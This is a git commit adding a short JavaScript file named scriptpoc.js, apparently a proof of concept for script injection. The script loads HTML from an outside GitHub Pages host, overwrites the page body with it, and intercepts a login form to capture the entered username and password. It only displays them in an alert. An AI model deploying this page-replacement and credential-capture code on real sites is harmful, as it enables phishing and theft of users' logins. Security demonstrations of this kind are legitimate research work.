ff53b58029d462ba69a43b111d7903e5d7e71bd5
pocg33 <139051177+pocg33@users.noreply.github.com>
2023-11-30 07:47:57 +0800

    Create scriptpoc.js

---
+++ scriptpoc.js
@@ -0,0 +1,17 @@
+fetch("https://pocg33.github.io/foo-dom/about.html").then(res=>res.text()).then(res => {
+
+
+  document.body.innerHTML = res;
+
+  const form = document.querySelector('#aa');
+
+  form.addEventListener("submit", function(evt) {
+    evt.preventDefault();
+
+    let login = document.querySelector('#user').value
+    let pass = document.querySelector('#pass').value
+    alert('Login: ' + login + " password: " + pass);
+
+    return;
+  }, true);
+})
